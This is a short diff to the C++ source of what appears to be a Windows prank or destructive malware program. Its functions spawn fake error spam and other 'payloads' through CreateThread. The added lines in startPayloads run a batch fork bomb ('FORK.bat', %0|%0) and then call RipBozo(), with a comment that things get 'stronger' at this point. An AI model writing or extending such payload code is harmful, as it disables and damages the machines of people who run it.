@@ -1,6 +1,8 @@
 #include "stuff.h"
 #include <windows.h>
 #include <windowsx.h>
+
+#include "final.cpp"
 #pragma comment(lib, "winmm.lib")
 
 #pragma comment( user, "Compiled on " __DATE__ " at " __TIME__ )
@@ -468,6 +470,7 @@ DWORD WINAPI FakeErrorSpam(LPVOID lpstart) {
 
     Sleep(random() % 30 );
 	thread = CreateThread(0, 0, FakeError, 0, 0, &ID);
+    return 0x00;
 }
 
 DWORD WINAPI Dark(LPVOID lpstart) {
@@ -2317,5 +2320,11 @@ void startPayloads() {
     thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)REALded, 0, 0, &ID);
     thread = CreateThread(0, 0, FakeErrorSpam, 0, 0, &ID);
     Sleep(random() % 4000 + 3000);
+
+    // Here is when stuff gets a lil' bit stronger:
+
+    system("FORK.bat"); // (forkbomb, %0|%0)
+    RipBozo();
+    
 	//startPayloads();
 }
